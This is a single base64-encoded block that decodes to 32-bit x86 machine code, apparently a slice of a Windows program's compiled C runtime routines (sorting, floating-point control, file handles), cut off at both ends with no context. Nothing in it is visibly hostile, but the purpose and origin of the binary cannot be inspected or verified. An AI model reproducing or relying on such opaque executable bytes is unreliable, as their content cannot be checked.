QQD/04PECIXAfhBW/7UE////V+jB/f//g8QMi4UE////i9iLtfz+//+LlQD///+JhQj///+NZCQAO/52NwPyibXw/v//O/dzJYuN+P7//1dW/xWoYUEA/5X4/v//i5UA////g8QIhcB+0zv+dz2LhQT///+Lnfj+//8D8jvwdx9XVovL/xWoYUEA/9OLlQD///+DxAiFwIuFBP///37bi50I////ibXw/v//i7X4/v//6waNmwAAAACLlQD///+LwyvaiYUI////O992H1dTi87/FahhQQD/1oPECIXAf9mLlQD///+LhQj///+LtfD+//+JnQj///873nJZiZXk/v//iZ3o/v//dDYr84vTi53k/v//6wONSQCKAo1SAYpMFv+IRBb/iEr/g+sBdeuLtfD+//+LnQj///+LlQD///+LhQT///87+w+F6/7//4v+6eT+//87+HM1i534/v//K8KJhQj///87x3YjV1CLy/8VqGFBAP/Ti5UA////g8QIhcCLhQj///901Tv4cjuLnfj+//+LtQD///8rxomFCP///zuF/P7//3YZV1CLy/8VqGFBAP/Tg8QIhcCLhQj///9014u18P7//4uVBP///4vKi738/v//K84rxzvBfEGLhQj///87+HMYi430/v//iXyNhImEjQz///9BiY30/v//i40E////i70A////O/EPg0n9//+Jtfz+///pe/z//zvycxiLhfT+//+JdIWEiZSFDP///0CJhfT+//+LhQj///+Ltfz+//+LvQD///878A+DCP3//4vI6Tj8///MzMzMzMzMzMzMzMxVi+xWM8BQUFBQUFBQUItVDI1JAIoCCsB0CYPCAQ+rBCTr8Yt1CIv/igYKwHQMg8YBD6MEJHPxjUb/g8QgXsnDi/9Vi+xRUaEE4EEAM8WJRfxTVot1GFeF9n4UVv91FOhCDgAAWTvGWY1wAXwCi/CLfSSF/3ULi0UIiwCLeAiJfSQzwDlFKGoAagAPlcBW/3UUjQTFAQAAAFBX6HWz//+L0IPEGIlV+IXSD4RYAQAAjQQSjUgIO8EbwCPBdDU9AAQAAHcT6KcxAACL3IXbdB7HA8zMAADrE1Doyor//4vYWYXbdAnHA93dAACDwwiLVfjrAjPbhdsPhAABAABSU1b/dRRqAVfoCrP//4PEGIXAD4TnAAAAi334M8BQ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YP///9nh2fDD2cDZ/NjZm9/gnnUa2cDcDRKvQQDZwNn83tmb3+CedA24AQAAAMO4AAAAAOv4uAIAAADr8VaD7HSL9FaD7AjdHCSD7AjdHCSb3XYI6NkHAACDxBTdZgjdBoPEdF6FwHQF6S4CAADDzMzMzMzMzMzMzIB6DgV1EWaLnVz///+AzwKA5/6zP+sEZrs/E2aJnV7////ZrV7///+7bq9BANnliZVs////m929YP///8aFcP///wCbio1h////0OHQ+dDBisEkD9cPvsCB4QQEAACL2gPYg8MQUFJRiwv/FahhQQBZWlj/I4B6DgV1EWaLnVz///+AzwKA5/6zP+sEZrs/E2aJnV7////ZrV7///+7bq9BANnliZVs////m929YP///8aFcP///wDZyYqNYf///9nlm929YP///9nJiq1h////0OXQ/dDFisUkD9eK4NDh0PnQwYrBJA/X0OTQ5ArED77AgeEEBAAAi9oD2IPDEFBSUYsL/xWoYUEAWVpY/yPoDwEAANnJjaQkAAAAAI1JAN3YjaQkAAAAAI2kJAAAAADD6O0AAADr6N3Y3djZ7sOQ3djd2NnuhO10Atngw93YkN3Y2ejDjaQkAAAAAI1kJADbvWL////brWL////2hWn///9AdAjGhXD///8Aw8aFcP///wDcBV6vQQDD6wPMzMzZyY2kJAAAAACNpCQAAAAA271i////261i////9oVp////QHQJxoVw////AOsHxoVw////AN7Bw42kJAAAAACQ271i////261i////9oVp////QHQg2cnbvWL////brWL////2hWn///9AdAnGhXD///8A6wfGhXD///8B3sHDkN3Y3djbLUCvQQCAvXD///8AfwfGhXD///8BCsnDjUkA3djd2NstVK9BAArtdALZ4ArJdAjdBWavQQDeycMKyXQC2eDDzMzMzMzMzMzMzMzM2cDZ/Nzh2cnZ4Nnw2ejewdn93dnDi1QkBIHiAAMAAIPKf2aJVCQG2WwkBsOpAAAIAHQGuAAAAADD3AWAr0EAuAAAAADDi0IEJQAA8H89AADwf3QD3QLDi0IEg+wKDQAA/3+JRCQGi0IEiwoPpMgLweELiUQkBIkMJNssJIPECqkAAAAAi0IEw4tEJAglAADwfz0AAPB/dAHDi0QkCMNmgTwkfwJ0A9ksJFrDZosEJGY9fwJ0HmaD4CB0FZvf4GaD4CB0DLgIAAAA6NkAAABaw9ksJFrDg+wI3RQki0QkBIPECCUAAPB/6xSD7AjdFCSLRCQEg8QIJQAA8H90PT0AAPB/dF9miwQkZj1/AnQqZoPgIHUhm9/gZoPgIHQYuAgAAACD+h10B+h7AAAAWsPoXQAAAFrD2SwkWsPdBayvQQDZydn93dnZwNnh3B2cr0EAm9/gnrgEAAAAc8fcDbyvQQDrv90FpK9BANnJ2f3d2dnA2eHcHZSvQQCb3+CeuAMAAAB2ntwNtK9BAOuWzMzMzFWL7IPE4IlF4ItFGIlF8ItFHIlF9OsJVYvsg8TgiUXg3V34iU3ki0UQi00UiUXoiU3sjUUIjU3gUFFS6LQEAACDxAzdRfhmgX0IfwJ0A9ltCMnDi/9Vi+yD7CCDPTD0QQAAVld0EP81WPdBAP8VdGFBAIv46wW/NIBAAItFFIP4Gg+P3gAAAA+EzAAAAIP4Dn9ldFBqAlkrwXQ6g+gBdCmD6AV0FYPoAQ+FlQEAAMdF5MivQQDpAQEAAIlN4MdF5MivQQDpPwEAAMdF5MSvQQDp5gAAAIlN4MdF5MSvQQDpJAEAAMdF4AMAAADHReTQr0EA6REBAACD6A90VIPoCXRDg+gBD4U5AQAAx0Xk1K9BAItFCIvPi3UQx0XgBAAAAN0Ai0UM3V3o3QCNReDdXfDdBlDdXfj/FahhQQD/11np+gAAAMdF4AMAAADpsQAAAMdF5NCvQQDruNnoi0UQ3Rjp3gAAAIPoGw+EjAAAAIPoAXRBg+gVdDOD6Al0JYPoA3QXLasDAAB0CYPoAQ+FsQAAAItFCN0A68LHReTYr0EA6xnHReTgr0EA6xDHReTor0EA6wfHReTUr0EAi0UIi8+LdRDHReABAAAA3QCLRQzdXejdAI1F4N1d8N0GUN1d+P8VqGFBAP/XWYXAdVHoymD//8cAIQAAAOtEx0XgAgAAAMdF5NSvQQCLRQiLz4t1EN0Ai0UM3V3o3QCNReDdXfDdBlDdXfj/FahhQQD/11mFwHUL6IRg///HACIAAADdRfjdHl9eycOL/1WL7FFRU1a+//8AAFZoPxsAAOir5P//3UUIi9hZWQ+3TQ648H8AACPIUVHdHCRmO8h1PehlCwAASFlZg/gCdwxWU+h75P//3UUI62HdRQjdBfCvQQBTg+wQ2MHdXCQI3RwkagxqCOiSAwAAg8Qc6z/oQAMAAN1V+N1FCIPECN3h3+D2xER7GPbDIHUTU4PsENnJ3VwkCN0cJGoMahDrx1bd2VPd2OgY5P//3UX4WVleW8nDzMzMzFWL7FdWU4tNEAvJdE2LdQiLfQy3QbNatiCNSQCKJgrkigd0JwrAdCODxgGDxwE653IGOuN3AgLmOsdyBjrDdwICxjrgdQuD6QF10TPJOuB0Cbn/////cgL32YvBW15fycOL/1WL7FFR3UUIUVHdHCTozwoAAFlZqJB1St1FCFFR3Rwk6HYCAADdRQjd4d/gWVnd2fbERHor3A0guEEAUVHdVfjdHCToUwIAAN1F+Nrp3+BZWfbERHoFagJYycMzwEDJw93YM8DJw4v/VYvs3UUIuQAA8H/Z4bgAAPD/OU0UdTuDfRAAdXXZ6NjR3+D2xAV6D93Z3djdBbC5QQDp6QAAANjR3+Dd2fbEQYtFGA+F2gAAAN3Y2e7p0QAAADlFFHU7g30QAHU12ejY0d/g9sQFegvd2d3Y2e7prQAAANjR3+Dd2fbEQYtFGA+FngAAAN3Y3QWwuUEA6ZEAAADd2DlNDHUug30IAA+FggAAANnu3UUQ2NHf4PbEQQ+Ec////9jZ3+D2xAWLRRh7Yt3Y2ejrXDlFDHVZg30IAHVT3UUQUVHdHCTot/7//9nu3UUQWVnY0YvI3+D2xEF1E93Z3djdBbC5QQCD+QF1INng6xzY2d/g9sQFeg+D+QF1Dt3Y3QXAuUEA6wTd2Nnoi0UY3RgzwF3Di/9Ti9xRUYPk8IPEBFWLawSJbCQEi+yB7IgAAAChBOBBADPFiUX8i0MQVotzDFcPtwiJjXz///+LBoPoAXQpg+gBdCCD6AF0F4PoAXQOg+gBdBWD6AN1bGoQ6w5qEusKahHrBmoE6wJqCF9RjUYYUFfoqgEAAIPEDIXAdUeLSwiD+RB0EIP5FnQLg/kddAaDZcD+6xKLRcDdRhCD4OODyAPdXbCJRcCNRhhQjUYIUFFXjYV8////UI1FgFDoSgMAAIPEGGj//wAA/7V8////6EPh//+DPghZWXQU6GlB//+EwHQLVuiGQf//WYXAdQj/NuguBgAAWYtN/F8zzV7o+d3+/4vlXYvjW8OL/1WL7FFR3UUI2fzdXfjdRfjJw4v/VYvsi0UIqCB0BGoF6xeoCHQFM8BAXcOoBHQEagLrBqgBdAVqA1hdww+2wIPgAgPAXcOL/1OL3FFRg+Twg8QEVYtrBIlsJASL7IHsiAAAAKEE4EEAM8WJRfxWi3MgjUMYV1ZQ/3MI6JUAAACDxAyFwHUmg2XA/lCNQxhQjUMQUP9zDI1DIP9zCFCNRYBQ6HwCAACLcyCDxBz/cwjoXv///1mL+OiBQP//hMB0KYX/dCXdQxhWg+wY3VwkENnu3VwkCN1DEN0cJP9zDFfoYwUAAIPEJOsYV+gpBQAAxwQk//8AAFboD+D//91DGFlZi038XzPNXujj3P7/i+Vdi+Nbw4v/VYvsg+wQU4tdCFaL84PmH/bDCHQW9kUQAXQQagHo/d///1mD5vfpnQEAAIvDI0UQqAR0EGoE6OTf//9Zg+b76YQBAAD2wwEPhJoAAAD2RRAID4SQAAAAagjowd///4tFEFm5AAwAACPBdFQ9AAQAAHQ3PQAIAAB0GjvBdWKLTQzZ7twZ3+DdBbi5QQD2xAV7TOtIi00M2e7cGd/g9sQFeyzdBbi5QQDrMotNDNnu3Bnf4PbEBXoe3QW4uUEA6x6LTQzZ7twZ3+D2xAV6CN0FsLlBAOsI3QWwuUEA2eDdGYPm/unhAAAA9sMCD4TYAAAA9kUQEA+EzgAAAItFDFeL+8HvBN0Ag+cB2e7d6d/g9sRED4ucAAAAjUX8UFFR3Rwk6KwEAACLVfyDxAyBwgD6///dVfDZ7oH6zvv//30HM//eyUfrZ97Z3+D2xEF1CcdF/AEAAADrBINl/ACLRfa5A/z//4PgD4PIEGaJRfY70X0wi0XwK8qLVfT2RfABdAWF/3UBR9Ho9kX0AYlF8HQIDQAAAICJRfDR6olV9IPpAXXYg338AN1F8HQC2eCLRQzdGOsFM//d2EeF/190CGoQ6Fve//9Zg+b99sMQdBH2RRAgdAtqIOhF3v//WYPm7zPAhfZeD5TAW8nDi/9Vi+xqAP91HP91GP91FP91EP91DP91COgFAAAAg8QcXcOL/1WL7ItFCDPJUzPbQ4lIBItFCFe/DQAAwIlICItFCIlIDItNEPbBEHQLi0UIv48AAMAJWAT2wQJ0DItFCL+TAADAg0gEAvbBAXQMi0UIv5EAAMCDSAQE9sEEdAyLRQi/jgAAwINIBAj2wQh0DItFCL+QAADAg0gEEItNCFaLdQyLBsHgBPfQM0EIg+AQMUEIi00IiwYDwPfQM0EIg+AIMUEIi00IiwbR6PfQM0EIg+AEMUEIi00IiwbB6AP30DNBCIPgAjFBCIsGi00IwegF99AzQQgjwzFBCOiN3f//i9D2wgF0B4tNCINJDBD2wgR0B4tFCINIDAj2wgh0B4tFCINIDAT2whB0B4tFCINIDAL2wiB0BotFCAlYDIsGuQAMAAAjwXQ1PQAEAAB0Ij0ACAAAdAw7wXUpi0UIgwgD6yGLTQiLAYPg/oPIAokB6xKLTQiLAYPg/QvD6/CLRQiDIPyLBrkAAwAAI8F0ID0AAgAAdAw7wXUii0UIgyDj6xqLTQiLAYPg54PIBOsLi00IiwGD4OuDyAiJAYtFCItNFMHhBTMIgeHg/wEAMQiLRQgJWCCDfSAAdCyLRQiDYCDhi0UY2QCLRQjZWBCLRQgJWGCLRQiLXRyDYGDhi0UI2QPZWFDrOotNCItBIIPg44PIAolBIItFGN0Ai0UI3VgQi0UICVhgi00Ii10ci0Fgg+Djg8gCiUFgi0UI3QPdWFDotNv//41FCFBqAWoAV/8VFGFBAItNCItBCKgQdAaDJv6LQQioCHQGgyb7i0EIqAR0BoMm94tBCKgCdAaDJu+LQQioAXQDgybfiwG6//P//4PgA4PoAHQ1g+gBdCKD6AF0DYPoAXUogQ4ADAAA6yCLBiX/+///DQAIAACJBusQiwYl//f//w0ABAAA6+4hFosBwegCg+AHg+gAdBmD6AF0CYPoAXUaIRbrFosGI8INAAIAAOsJiwYjwg0AAwAAiQaDfSAAXnQH2UFQ2RvrBd1BUN0bX1tdw4v/VYvsi0UIg/gBdBWDwP6D+AF3GOiKVv//xwAiAAAAXcPofVb//8cAIQAAAF3Di/9Vi+yLVQyD7CAzyYvBORTFKLhBAHQIQIP4HXzx6weLDMUsuEEAiU3khcl0VYtFEIlF6ItFFIlF7ItFGIlF8ItFHFaLdQiJRfSLRSBo//8AAP91KIlF+ItFJIl14IlF/Ohe2v//jUXgUOiuOv//g8QMhcB1B1boVf///1ndRfheycNo//8AAP91KOg02v///3UI6Dn////dRSCDxAzJw4v/VYvs3UUI2e7d4d/gVvbERHoJ3dkz9umtAAAAV2aLfQ4Pt8ep8H8AAHV6i00Mi1UI98H//w8AdQSF0nRo3tm+A/z//9/gUzPb9sRBdQFD9kUOEHUfA8mJTQyF0nkGg8kBiU0MA9JO9kUOEHToZot9DolVCLjv/wAAZiP4hdsPt8dmiX0OW3QJDQCAAABmiUUO3UUIagBRUd0cJOgxAAAAg8QM6yNqAFHd2FHdHCToHgAAAA+394PEDMHuBIHm/wcAAIHu/gMAAF+LRRCJMF5dw4v/VYvsUVGLTRAPt0UO3UUIJQ+AAADdXfiNif4DAADB4QQLyGaJTf7dRfjJw4v/VYvsgX0MAADwf4tFCHUHhcB1FUBdw4F9DAAA8P91CYXAdQVqAlhdw2aLTQ66+H8AAGYjymY7ynUEagPr6LrwfwAAZjvKdRH3RQz//wcAdQSFwHQEagTrzTPA